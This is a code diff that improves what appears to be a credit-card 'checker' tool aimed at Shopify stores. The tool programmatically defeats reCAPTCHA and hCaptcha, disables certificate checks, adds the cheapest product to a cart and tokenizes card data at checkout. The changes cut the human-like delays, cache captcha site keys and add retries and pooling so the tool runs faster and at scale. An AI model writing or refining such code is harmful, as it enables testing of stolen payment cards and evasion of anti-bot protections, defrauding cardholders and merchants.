@@ -15,6 +15,7 @@ import sys
 import logging
 import urllib3
 import os
+import threading
 
 try:
     sys.stdout.reconfigure(encoding="utf-8", errors="ignore")
@@ -36,10 +37,15 @@ logger = logging.getLogger(__name__)
 # CONFIGURATION
 # ============================================
 
-API_KEY = "DARK-STORMX-DEEPX"  # Your API key
-CAPTCHA_SOLVER_ENABLED = True
-MAX_RETRIES = 3
-RETRY_DELAY = 2
+API_KEY = os.environ.get("API_KEY", "DARK-STORMX-DEEPX")  # Your API key
+CAPTCHA_SOLVER_ENABLED = os.environ.get("CAPTCHA_SOLVER_ENABLED", "True").lower() == "true"
+MAX_RETRIES = int(os.environ.get("MAX_RETRIES", "2"))
+RETRY_DELAY = float(os.environ.get("RETRY_DELAY", "0.5"))
+REQUEST_TIMEOUT = int(os.environ.get("REQUEST_TIMEOUT", "8"))
+SITEKEY_CACHE_EXPIRY = int(os.environ.get("SITEKEY_CACHE_EXPIRY", "300"))
+
+site_key_cache = {}
+site_key_cache_lock = threading.Lock()
 
 # Checkout data
 CHECKOUT_DATA = {
@@ -71,33 +77,33 @@ DEFAULT_CARD_DATA = {
 # CAPTCHA SOLVER FUNCTIONS
 # ============================================
 
-def detect_site_key_from_page(store_url, timeout=10):
+def detect_site_key_from_page(session, store_url, timeout=REQUEST_TIMEOUT):
     """Detect captcha site key from store page"""
     try:
         if not store_url.startswith(('http://', 'https://')):
             store_url = 'https://' + store_url
 
-        paths_to_check = ['', '/checkout', '/cart', '/account/login']
-        session = requests.Session()
-        session.verify = False
+        domain = urlparse(store_url).netloc
+        cached = get_cached_site_key(domain)
+        if cached:
+            return cached
 
+        paths_to_check = ['/checkout', '/cart', '/account/login', '']
         for path in paths_to_check:
             try:
                 url = urljoin(store_url, path)
                 headers = {
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                    "Accept": "text/html,application/xhtml+xml",
+                    "User-Agent": session.headers.get('User-Agent', "Mozilla/5.0"),
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                 }
-                response = session.get(url, headers=headers, timeout=timeout)
+                response = session.get(url, headers=headers, timeout=timeout, verify=False)
                 if response.status_code == 200:
                     result = parse_captcha_from_html(response.text, store_url)
                     if result and result.get('success'):
-                        session.close()
+                        set_cached_site_key(domain, result)
                         return result
-            except:
+            except Exception:
                 continue
-
-        session.close()
     except Exception as e:
         logger.error(f"Site key detection error: {e}")
 
@@ -149,15 +155,13 @@ def parse_captcha_from_html(html_content, base_url=""):
     return {"success": False}
 
 
-def solve_recaptcha_v2(site_key, page_url="https://example.com", invisible=True, max_retries=5):
+def solve_recaptcha_v2(session, site_key, page_url="https://example.com", invisible=True, max_retries=3, timeout=REQUEST_TIMEOUT):
     """Solve reCAPTCHA v2"""
     start_time = time.time()
 
     for attempt in range(max_retries):
         try:
-            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
             co_value = "aHR0cHM6Ly9jaGVja291dC5zaG9waWZ5LmNvbTo0NDM."
-
             anchor_params = {
                 "ar": str(random.randint(1, 5)),
                 "hl": "en",
@@ -173,60 +177,61 @@ def solve_recaptcha_v2(site_key, page_url="https://example.com", invisible=True,
             )
 
             headers = {
-                "User-Agent": user_agent,
+                "User-Agent": session.headers.get('User-Agent', "Mozilla/5.0"),
                 "Accept": "text/html,application/xhtml+xml",
             }
 
-            session = requests.Session()
-            session.verify = False
-            response = session.get(anchor_url, headers=headers, timeout=15)
+            response = session.get(anchor_url, headers=headers, timeout=timeout, verify=False)
+            if response.status_code != 200:
+                raise ValueError(f"Anchor request failed: {response.status_code}")
 
-            if response.status_code == 200:
-                token_match = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', response.text)
-                if token_match:
-                    token = token_match.group(1)
+            token_match = re.search(r'id="recaptcha-token"\s+value="([^"]+)"', response.text)
+            if not token_match:
+                raise ValueError("No recaptcha token found")
 
-                    reload_data = {
-                        "v": "UFwvoDBMjc8LiYc1DKXiAomK",
-                        "reason": "q",
-                        "c": token,
-                        "k": site_key,
-                        "co": co_value,
-                        "hl": anchor_params['hl'],
-                        "size": "invisible" if invisible else "normal",
-                        "chr": f"[{random.randint(60,90)},{random.randint(30,60)},{random.randint(80,100)}]",
-                        "vh": str(random.randint(7000000000, 8000000000)),
-                        "bg": ""
+            token = token_match.group(1)
+            reload_data = {
+                "v": "UFwvoDBMjc8LiYc1DKXiAomK",
+                "reason": "q",
+                "c": token,
+                "k": site_key,
+                "co": co_value,
+                "hl": anchor_params['hl'],
+                "size": "invisible" if invisible else "normal",
+                "chr": f"[{random.randint(60,90)},{random.randint(30,60)},{random.randint(80,100)}]",
+                "vh": str(random.randint(7000000000, 8000000000)),
+                "bg": ""
+            }
+
+            reload_response = session.post(
+                "https://www.google.com/recaptcha/api2/reload",
+                data=reload_data,
+                headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
+                timeout=timeout,
+                verify=False
+            )
+            if reload_response.status_code != 200:
+                raise ValueError(f"Reload request failed: {reload_response.status_code}")
+
+            captcha_token_match = re.search(r'"rresp","([^"]+)"', reload_response.text)
+            if captcha_token_match:
+                captcha_token = captcha_token_match.group(1)
+                if len(captcha_token) > 10:
+                    return {
+                        "success": True,
+                        "token": captcha_token,
+                        "site_key": site_key,
+                        "page_url": page_url,
+                        "captcha_type": "recaptcha",
+                        "time_taken": round(time.time() - start_time, 2),
+                        "attempt": attempt + 1
                     }
 
-                    reload_response = session.post(
-                        "https://www.google.com/recaptcha/api2/reload",
-                        data=reload_data,
-                        headers={**headers, "Content-Type": "application/x-www-form-urlencoded"},
-                        timeout=15
-                    )
-
-                    if reload_response.status_code == 200:
-                        captcha_token_match = re.search(r'"rresp","([^"]+)"', reload_response.text)
-                        if captcha_token_match:
-                            captcha_token = captcha_token_match.group(1)
-                            if len(captcha_token) > 10:
-                                session.close()
-                                return {
-                                    "success": True,
-                                    "token": captcha_token,
-                                    "site_key": site_key,
-                                    "page_url": page_url,
-                                    "captcha_type": "recaptcha",
-                                    "time_taken": round(time.time() - start_time, 2),
-                                    "attempt": attempt + 1
-                                }
-
-            session.close()
+            raise ValueError("Captcha token not found")
 
         except Exception as e:
+            logger.debug(f"reCAPTCHA attempt {attempt + 1} failed: {e}")
             if attempt < max_retries - 1:
-                time.sleep(1)
                 continue
 
     return {
@@ -236,14 +241,12 @@ def solve_recaptcha_v2(site_key, page_url="https://example.com", invisible=True,
     }
 
 
-def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
+def solve_hcaptcha(session, site_key, page_url="https://example.com", max_retries=2, timeout=REQUEST_TIMEOUT):
     """Solve hCaptcha"""
     start_time = time.time()
 
     for attempt in range(max_retries):
         try:
-            session = requests.Session()
-            session.verify = False
             response = session.post(
                 "https://hcaptcha.com/getcaptcha",
                 data={
@@ -254,16 +257,16 @@ def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
                     "swa": "1"
                 },
                 headers={
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                    "User-Agent": session.headers.get('User-Agent', "Mozilla/5.0"),
                     "Content-Type": "application/x-www-form-urlencoded",
                 },
-                timeout=15
+                timeout=timeout,
+                verify=False
             )
 
             if response.status_code == 200:
                 result = response.json()
                 if "key" in result or "token" in result:
-                    session.close()
                     return {
                         "success": True,
                         "token": result.get("key") or result.get("token"),
@@ -274,11 +277,11 @@ def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
                         "attempt": attempt + 1
                     }
 
-            session.close()
+            raise ValueError(f"Invalid hcaptcha status: {response.status_code}")
 
         except Exception as e:
+            logger.debug(f"hCaptcha attempt {attempt + 1} failed: {e}")
             if attempt < max_retries - 1:
-                time.sleep(1)
                 continue
 
     return {
@@ -288,7 +291,7 @@ def solve_hcaptcha(site_key, page_url="https://example.com", max_retries=3):
     }
 
 
-def solve_captcha_auto(shop_url, max_retries=3):
+def solve_captcha_auto(session, shop_url, max_retries=2):
     """
     Auto-detect and solve captcha
     Returns captcha token if successful, None if failed
@@ -298,44 +301,30 @@ def solve_captcha_auto(shop_url, max_retries=3):
 
     for attempt in range(max_retries):
         try:
-            # Step 1: Detect site key from page
-            detection_result = detect_site_key_from_page(shop_url)
-
+            detection_result = detect_site_key_from_page(session, shop_url)
             if not detection_result.get('success'):
                 logger.warning(f"⚠️ Could not detect captcha type")
-                if attempt < max_retries - 1:
-                    time.sleep(RETRY_DELAY)
                 continue
 
             captcha_type = detection_result.get('captcha_type', 'recaptcha')
             site_key = detection_result.get('site_key')
-
             logger.info(f"✅ Detected {captcha_type} with site key: {site_key[:20]}...")
 
-            # Step 2: Solve based on captcha type
             if captcha_type == 'recaptcha':
-                solve_result = solve_recaptcha_v2(site_key, shop_url)
+                solve_result = solve_recaptcha_v2(session, site_key, shop_url)
             elif captcha_type == 'hcaptcha':
-                solve_result = solve_hcaptcha(site_key, shop_url)
+                solve_result = solve_hcaptcha(session, site_key, shop_url)
             else:
                 logger.warning(f"⚠️ Unsupported captcha type: {captcha_type}")
-                if attempt < max_retries - 1:
-                    time.sleep(RETRY_DELAY)
                 continue
 
             if solve_result.get('success'):
                 logger.info(f"✅ Captcha solved in {solve_result.get('time_taken', 'N/A')}s")
                 return solve_result.get('token')
-            else:
-                logger.warning(f"⚠️ Captcha solve failed: {solve_result.get('error', 'Unknown')}")
-
-            if attempt < max_retries - 1:
-                time.sleep(RETRY_DELAY)
+            logger.warning(f"⚠️ Captcha solve failed: {solve_result.get('error', 'Unknown')}")
 
         except Exception as e:
             logger.error(f"❌ Captcha API error: {e}")
-            if attempt < max_retries - 1:
-                time.sleep(RETRY_DELAY)
 
     return None
 
@@ -356,6 +345,19 @@ def create_session(shop_url, proxies=None):
         'Origin': shop_url,
         'Referer': f'{shop_url}/',
     })
+    adapter = requests.adapters.HTTPAdapter(
+        max_retries=requests.adapters.Retry(
+            total=2,
+            status_forcelist=[429, 500, 502, 503, 504],
+            backoff_factor=0.5,
+            raise_on_status=False,
+            raise_on_redirect=False
+        ),
+        pool_connections=10,
+        pool_maxsize=10
+    )
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
     if proxies:
         try:
             session.proxies.update(proxies)
@@ -364,11 +366,29 @@ def create_session(shop_url, proxies=None):
     return session
 
 
+def get_cached_site_key(domain):
+    """Return cached site key for a domain if fresh"""
+    with site_key_cache_lock:
+        cached = site_key_cache.get(domain)
+        if cached and cached.get('expires_at', 0) > time.time():
+            return cached.get('data')
+    return None
+
+
+def set_cached_site_key(domain, data):
+    """Cache a detected site key for a domain"""
+    with site_key_cache_lock:
+        site_key_cache[domain] = {
+            'data': data,
+            'expires_at': time.time() + SITEKEY_CACHE_EXPIRY
+        }
+
+
 def get_cheapest_product(session, shop_url):
     """Get cheapest product from shop"""
     try:
         url = f"{shop_url}/products.json?limit=250"
-        r = session.get(url, timeout=15, verify=False)
+        r = session.get(url, timeout=REQUEST_TIMEOUT, verify=False)
         if r.status_code == 200:
             data = r.json()
             products = data if isinstance(data, list) else data.get('products', [])
@@ -413,10 +433,10 @@ def add_to_cart(session, shop_url, variant_id):
     try:
         add_url = f"{shop_url}/cart/add.js"
         payload = {"id": variant_id, "quantity": 1}
-        r = session.post(add_url, json=payload, timeout=15, verify=False)
+        r = session.post(add_url, json=payload, timeout=REQUEST_TIMEOUT, verify=False)
 
         checkout_url = f"{shop_url}/checkout"
-        r = session.get(checkout_url, allow_redirects=True, timeout=15, verify=False)
+        r = session.get(checkout_url, allow_redirects=True, timeout=REQUEST_TIMEOUT, verify=False)
 
         final_url = r.url
         if '/checkouts/cn/' in final_url:
@@ -431,7 +451,7 @@ def add_to_cart(session, shop_url, variant_id):
 def tokenize_card(session, checkout_token, shop_url, card_data):
     """Tokenize credit card"""
     try:
-        time.sleep(random.uniform(1.2, 2.0))
+        time.sleep(0.1)
 
         scope_host = urlparse(shop_url).netloc or shop_url.replace('https://', '').replace('http://', '').split('/')[0]
 
@@ -461,7 +481,7 @@ def tokenize_card(session, checkout_token, shop_url, card_data):
             "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0"),
         }
 
-        r = session.post(ep_url, json=payload, headers=headers, timeout=15, verify=False)
+        r = session.post(ep_url, json=payload, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
 
         if r.status_code == 200:
             token_data = r.json()
@@ -566,7 +586,7 @@ def checker_api():
         # Step 1: Solve captcha (if enabled)
         if CAPTCHA_SOLVER_ENABLED:
             logger.info("🔄 Solving captcha...")
-            captcha_token = solve_captcha_auto(shop_url)
+            captcha_token = solve_captcha_auto(session, shop_url)
             if captcha_token:
                 result["captcha_solved"] = True
                 result["captcha_token"] = captcha_token
